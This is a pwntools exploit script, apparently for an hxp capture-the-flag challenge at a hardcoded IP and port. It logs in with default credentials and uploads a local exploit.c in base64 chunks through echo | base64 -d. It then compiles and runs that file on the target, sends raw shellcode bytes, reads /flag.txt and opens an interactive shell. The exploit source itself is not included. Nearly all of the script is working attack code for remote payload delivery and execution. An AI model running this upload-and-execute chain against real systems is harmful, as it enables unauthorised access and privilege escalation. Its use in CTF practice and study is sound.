from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

#TARGET = './challenge'
HOST = '138.68.69.139'
PORT =  13370

#elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process('./run.sh')
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def solve_pow():
    r.recvuntilb(b'"')
    hash_head = r.recvuntilb(b'"', True)
    r.recvuntilb(b'with ')
    bits = r.recvuntilb(b' ', True)
    import subprocess

    cmd = ["./pow-solver", bits.decode(), hash_head.decode()]
    print(cmd)
    result = subprocess.run(
        cmd,      # 実行するバイナリ
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True              # 文字列として受け取る（Python 3.7+）
    )

    r.sendlineafter(b').\n', result.stdout.encode()[:-1])

#solve_pow()
r.sendlineafter(b'login: ', b'hxp')
r.sendlineafter(b'Password: ', b'hxp')
with open('./exploit.c', 'rb') as f:
    inp = f.read()

r.sendlineafter(b'(hxp)', f'touch /tmp/exp.c'.encode())
payload = b64e(inp)
for i in range(0, len(payload), 0x100):
    r.sendlineafter(b'(hxp)', f'echo {payload[i:i+0x100]} | base64 -d >> /tmp/exp.c'.encode())
r.sendlineafter(b'(hxp)', f'cd /tmp'.encode())
r.sendlineafter(b'(hxp)', f'gcc ./exp.c'.encode())
r.sendlineafter(b'(hxp)', f'./a.out'.encode())
r.sendafter(b'a.out\n', b'\x31\xc0\xc3')
r.sendline(b'cat /flag.txt')



r.interactive()
r.close()

